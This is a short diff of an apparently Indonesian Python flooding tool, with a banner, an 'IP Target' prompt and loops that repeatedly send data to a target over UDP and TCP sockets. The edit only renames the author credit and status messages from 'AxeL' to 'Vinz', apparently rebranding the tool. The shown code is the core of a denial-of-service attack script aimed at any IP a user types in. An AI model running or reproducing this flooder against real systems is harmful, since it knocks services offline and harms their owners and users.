@@ -19,7 +19,7 @@ print("""
  | |\  | (_| | (_| | (_| | |_| |  __/ 
  |_| \_|\__,_|\__,_|\__, |\___/|_|    
                     |___/             
-               Tools By AxeL
+               Tools By Vinz
 """)
 
 ip = str(input("\033[95m=====> + IP Target    : "))
@@ -48,7 +48,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" AXELOREZ MENGIRIM")
+			print(i +" VINZSAMP MENGIRIM")
 		except:
 			print("[!] Error!!!")
 
@@ -62,7 +62,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" AXELOREZ MENGIRIM")
+			print(i +" VINZSAMP MENGIRIM")
 		except:
 			s.close()
 			print("[*] Error")
